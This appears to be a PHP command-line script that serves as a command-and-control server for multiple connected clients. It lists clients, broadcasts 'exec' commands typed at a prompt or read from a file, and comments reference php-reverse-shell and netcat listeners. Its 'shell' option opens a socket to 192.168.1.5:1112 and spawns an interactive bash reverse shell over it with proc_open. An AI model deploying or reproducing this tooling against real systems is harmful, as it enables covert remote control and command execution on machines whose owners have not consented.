#!/usr/local/bin/php -q
<?php

	set_time_limit(0);
	ob_implicit_flush(1);

	if($argc<3){
		die("Assign host addr and port\n");
	}

	// php server.php 127.0.0.1 1111
	// -nlvp 4444 (Numeric-only IP addresses, Listen Verbosely on Port 4444)
	// /mnt/d/terminal/php-reverse-shell-1.0/php-reverse-shell.php
	// /___projects/phpncreverseshell/php-reverse-shell.php
	
	/*************************	auth. ****************************/
	//require_once './serverlogin.php';
	//if(!calllogin()) die("Login failed");
	/**********************	end of auth. *************************/

	$host_addr 		= trim($argv[1]);
	$host_port 		= trim($argv[2]);
	$arg 			= (($argc-1) === 3) ? $argv[3] : '';

	if (($master_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false)	// create
	{
	    echo "\33[91m[!] socket_create() failed: reason: ".socket_strerror(socket_last_error())."\33[0m\n";
	}


	// TODO: more options
	socket_set_option($master_sock, SOL_SOCKET, SO_REUSEADDR, 1);


	if (socket_bind($master_sock, $host_addr, $host_port) === false)	// bind
	{
	    echo "\33[91m[!] socket_bind() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n";
	}
	if (socket_listen($master_sock) === false)	// listen
	{
	    echo "\33[91m[!] socket_listen() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n";
	}
	
	echo "\33[36mHost [".$host_addr.":".$host_port."] listening for incomming connections..\33[0m\n\n";
	
	$clients 		 = array($master_sock);
	$cstm 	 		 = array();
	$cnt 			 = 0;

	while (true) {
	       
	    // create a copy, so $clients doesn't get modified by socket_select()
		$write = $recv = $clients;
		$except = NULL;
		$now = date('H:i:s');

	    if(socket_select($recv, $write, $except, NULL) === false)
	    {
	    	die("\33[91m[!] socket_select() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
	    }
	    if(in_array($master_sock, $recv))
	    {
			if (($clients[] = $recv_sock = socket_accept($master_sock)) === false)
			{
		        die("\33[91m[!] socket_accept() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
		    }

			socket_getpeername($recv_sock, $ip, $port);
		    $cstm [] = array("ip" => $ip, "port" => $port);

		    echo "[".$now."] \33[32mClient connected on IP: [".$ip.":".$port."]\33[0m\n";

	        // remove the listening socket from the clients-with-data array
	        $key = array_search($clients, $recv);
	        unset($recv[$key]);

	        continue;
	    }


	    foreach ($recv as $recv_sock)
	    {
	    	socket_getpeername($recv_sock, $ip, $port);
			$now = date('H:i:s');
	        
	        if (($data = @socket_read($recv_sock, 4096, PHP_BINARY_READ)) === false || $data === "")
	        {
	            $key = array_search($recv_sock, $clients);
	            $_key = array_search($port, array_map(function($v){return $v['port'];},$cstm));
	            
	            unset($clients[$key]);
	            unset($recv[$key]);
	            unset($write[$key]);
	            unset($cstm[$_key]); 	// u realnom okruzenju - IP umjesto porta

	            echo "[".$now."] \33[38;5;208mClient ".$ip.":".$port." disconnected.\33[0m\n";
	            continue;
	        }
 
          	$data = trim($data);
    
	        if(!empty($data))
		    	echo "Client [\33[95m".$ip.":".$port."\33[0m] :".$data."\n";

    	   	// $clients minus master socket
	    	// $cstm = array of connected clients (ip:port)
			// $line needs to be flushed => line=exec until data is recieved back
			// flush $line when data is recieved from all clients

		    if(count($cstm) == count($clients)-1)
		    	$line = "";	
		}

		
		// cnt > 1 => current client off => infinite loop
    	if(@preg_match('/^(exec)\s\w+/', $line) && $cnt < 2)
    	{
    		echo ($cnt < 1) ? "Executing..\n" : "\33[91mExecute failed..\33[0m\n";
    		$cnt++;
    		sleep(1);	// wait 1 sec until client/s send callback
    		continue;
    	}
    	else
    	{
			$line = readline(">>> ");
    		readline_add_history($line);
    		$cnt = 0;
    	}
	
		// reading/sending a file of commands
		if(preg_match('/^exec\s[\-f]*\s[\.{0,2}\/]*\w*\.\w{2,3}$/', $line))
		{
			$file = substr($line, 8);

			if(file_exists($file))
			{
				$fp = fopen($file, 'rb');
				$cmdsarr = explode("\n", fread($fp, filesize($file)));
				fclose($fp);

				foreach ($cmdsarr as $cmd)
				{
					$cmd = trim("exec ".$cmd);
					foreach ($write as $send_sock)
			  		{
				        if($send_sock == $master_sock)
				            continue;

				        else if(@socket_write($send_sock, $cmd."\n") === false)
				        {	
				        	echo "\33[91mWrite error: ".socket_strerror(socket_last_error($send_sock))."\33[0m\n";
				        }	
			    	}
				}

				continue;
			}
			else 
			{
				echo "Invalid path.\n";
				continue;
			}
		}

	    switch ($line) {
	    	case 'clients':
	    		echo "\33[95mClients: ".(count($clients)-1)."\33[0m\n";
	    		print_r($cstm);
	    		break;
	    	case 'exit':
				echo "Closing master socket..\n";
				socket_close($master_sock);	
				exit();
			case 'shell':

				// 0=stdin
				// 1=stdout
				// 2=stderr

				// ">&"				===> re-directs output of one file to another
				// 0<&-, <&- 		===> close stdin
				// 1>&-, >&- 		===> close stout
				// 'n<&-' or 'n>&-' ===> close input/output fd 'n'

				//  <&2 			===> stdin to stderr
				//  >&2				===> all stdout to stderr
				//	1>&2			===> stdout to stderr

				
				chdir("/");

				$sock = fsockopen("192.168.1.5",1112);
			 	$descriptorspec = array(
			        0 => array("pipe", "r"),	// stdin
			        1 => array("pipe", "w"),	// stdout
			        2 => array("pipe", "w"),    // stderr
			    	3 => $sock 					// socket file descriptor
			    );
			    $command = 'uname -a; w; id; >&1 /bin/bash -i <&3 >&3 2>&3;';
			    $process = proc_open($command, $descriptorspec, $pipes);

			    if (!is_resource($process)) {
			    	echo "Shell spawn failed.\n";
			    	exit(1);
				}

			    fclose($pipes[0]);
			    fclose($pipes[1]);
			    fclose($pipes[2]);
			    fclose($sock);

			    $return_value = proc_close($process);
				break;


			case 'options':
				echo options();
				break;
	    	default:
	    		break;
	    }


		if(count($clients) === 1)	// only master socket = no clients
		{
			echo "\33[38;5;208mNo connected clients..\33[0m\nListening..\n";
			$line = "";
		}
		if(!empty($cstm) && !empty($write))
		{
		    if(!empty($line) && $line != 'clients'
		    				 && $line != 'exit'
		    				 && $line != 'options'
		    				 && $line != 'shell')
		    {
			  	foreach ($write as $send_sock)
			  	{
			        if($send_sock == $master_sock)
			            continue;

			        else if(@socket_write($send_sock, $line."\n") === false)
			        {	
			        	echo "\33[91mWrite error: ".socket_strerror(socket_last_error($send_sock))."\33[0m\n";
			        }	
			    }
			}
		}
	}

	echo "Closing master socket..\n";
	socket_close($master_sock);
	exit(0);



	/*******************************************/
	/*******************************************/
	/*******************************************/


	function options(){
		return "<clients>\t\t\t- display connected clients\n<dc>\t\t\t\t- disconnect all clients\n<exit>\t\t\t\t- exit script\n<shell>\t\t\t\t- opens a shell on port 80\n<exec> <cmd>\t\t\t- execute command\n<exec> <-f> <path>\t\t- execute from file\n";
	}
?>